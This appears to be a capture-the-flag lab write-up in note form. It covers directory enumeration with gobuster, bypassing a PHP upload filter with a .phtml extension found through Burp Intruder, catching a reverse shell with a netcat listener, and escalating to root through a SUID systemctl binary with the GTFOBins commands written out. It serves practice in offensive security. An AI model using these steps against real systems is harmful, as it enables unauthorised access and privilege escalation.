fiding hidden path on HTTP
gobuster dir -u http://10.10.120.159:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
=> found /internal/ on HTTP

using BurpSuite to intercept the upload process => try to upload a file to see the response => Extension not allowed
As the web write with php => can try other php file type like php3, php4,php5, phtml => sent the POST request to instruder module on burp => Add the .php as position => add the possible file type into the payloads => sniper attack

The result for phtml will be different vs other => success => can use a php reverse shell
Downloading a php reverse shell and change the IP address (your tunnel IP) and port to 1234 (just to match with the nc command)
=> upload to the server => can try use gobuster to dig for the hidden dir in internal/ => found uploads 
netcat the connection: nc -lvnp 1234
=> run the uploaded reverse shell on webbrowser (netcat the connection first) => got access to the shell as www-data user
=> cd home to find the user and user flag

using SUID misconfig to PE 
search for SUID file with:
find / -type f -perm -4000 -user root -exec ls -l {} \;
=> found /bin/systemctl that can exploit on GTFOBins

cd into /bin
run line by line:
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF

=> the root flag should be in the /tmp/output file
